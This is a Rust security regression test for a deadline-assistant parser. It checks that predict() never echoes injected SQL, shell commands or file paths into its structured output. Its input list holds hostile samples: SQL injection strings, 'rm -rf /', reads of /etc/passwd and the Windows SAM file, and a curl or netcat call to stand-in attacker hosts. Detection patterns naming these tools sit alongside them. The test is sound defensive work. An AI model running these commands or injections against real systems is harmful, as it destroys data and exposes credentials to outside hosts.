//! Security regression test (spec section 21/29).
//!
//! The architecture already prevents this by construction: entities.rs only
//! ever produces values pulled from a fixed lexicon (courses, topics, date
//! words) or narrow regex captures (numbers, times, deadline ids), and
//! StructuredPrediction is a plain data struct with no method that executes
//! anything (see the invariant documented next to the struct in
//! inference.rs). This test is a guard against that invariant quietly
//! breaking later -- e.g. someone adding a free-text passthrough entity, or
//! wiring predict() output into a format string that gets shelled out.
//!
//! It works by throwing adversarial-looking input at predict() (SQL
//! injection attempts, shell metacharacters, path traversal) and asserting
//! that nothing resembling SQL, a shell command, or a file path ends up in
//! any string field of the resulting StructuredPrediction.

// NOTE: `cargo test` (which runs both tests/integration_test.rs and this
// file, alongside the inline #[cfg(test)] unit tests in src/*.rs) should be
// wired into CI to run on every push once CI exists for this repo. That's
// out of scope for this section -- this comment is just the marker so it
// isn't forgotten when CI gets set up.

use reinitialized::inference::predict;
use reinitialized::model::Model;

fn load_real_model() -> Model {
    Model::load("../models/model_artifact.json")
        .expect("models/model_artifact.json should load -- run `python python/export.py` first")
}

const ADVERSARIAL_INPUTS: &[&str] = &[
    "'; DROP TABLE deadlines; --",
    "add HDL deadline'; DELETE FROM users WHERE '1'='1",
    "SELECT * FROM secrets WHERE course = 'HDL'",
    "add deadline && rm -rf /",
    "add deadline; cat /etc/passwd",
    "add deadline `whoami`",
    "add deadline $(curl evil.example.com)",
    "../../../../etc/passwd",
    "C:\\Windows\\System32\\config\\SAM",
    "add HDL deadline | nc attacker.example.com 4444",
];

/// Crude but effective sniffers for the three categories spec section 21
/// cares about. These deliberately overmatch (better to have this test be a
/// little noisy than to miss a real leak) -- the point is that predict()'s
/// output should contain *none* of these patterns for any of the inputs
/// above, since entity values are always drawn from closed lexicons/regex
/// captures, never echoed verbatim from arbitrary input.
fn looks_like_sql(s: &str) -> bool {
    let upper = s.to_uppercase();
    ["DROP TABLE", "DELETE FROM", "SELECT *", "INSERT INTO", "--", "'1'='1"]
        .iter()
        .any(|pat| upper.contains(pat))
}

fn looks_like_shell_command(s: &str) -> bool {
    ["rm -rf", "&&", "||", "$(", "`", "curl ", "wget ", "| nc", "cat /etc"]
        .iter()
        .any(|pat| s.contains(pat))
}

fn looks_like_file_path(s: &str) -> bool {
    s.contains("/etc/") || s.contains("../") || s.contains("System32") || s.contains(":\\")
}

fn assert_field_is_clean(field_name: &str, value: &str, input: &str) {
    assert!(
        !looks_like_sql(value),
        "field {field_name:?} = {value:?} (from input {input:?}) looks like SQL"
    );
    assert!(
        !looks_like_shell_command(value),
        "field {field_name:?} = {value:?} (from input {input:?}) looks like a shell command"
    );
    assert!(
        !looks_like_file_path(value),
        "field {field_name:?} = {value:?} (from input {input:?}) looks like a file path"
    );
}

#[test]
fn structured_prediction_never_echoes_adversarial_input_verbatim() {
    let model = load_real_model();

    for input in ADVERSARIAL_INPUTS {
        let result = predict(&model, input);

        // intent is always one of the model's fixed labels, never derived
        // from input text, but check anyway as a contract assertion.
        assert_field_is_clean("intent", &result.intent, input);

        // Every entity value (string variant) must also be clean. Numeric
        // entity values (EntityValue::Int) can't contain strings at all, so
        // only the Text variant needs checking here.
        for (key, value) in result.entities.iter() {
            if let reinitialized::entities::EntityValue::Text(s) = value {
                assert_field_is_clean(key, s, input);
            }
        }
    }
}

#[test]
fn structured_prediction_is_plain_data_with_no_reachable_side_effects() {
    // Documentation-as-test (see the invariant comment next to
    // StructuredPrediction in inference.rs): this doesn't (and can't, from
    // outside the crate) prove the absence of an `execute`-like method --
    // Rust has no reflection for that -- but it pins down the current field
    // set so that adding a new field (e.g. a raw command string, a query
    // template) is a visible, deliberate diff to this test rather than a
    // silent addition.
    let model = load_real_model();
    let result = predict(&model, "add HDL deadline tomorrow");

    // If StructuredPrediction gains fields, this destructure forces the
    // test (and whoever changed inference.rs) to consciously decide whether
    // the new field also needs a cleanliness check above.
    let reinitialized::inference::StructuredPrediction {
        intent: _,
        confidence: _,
        confidence_band: _,
        entities: _,
    } = result;
}
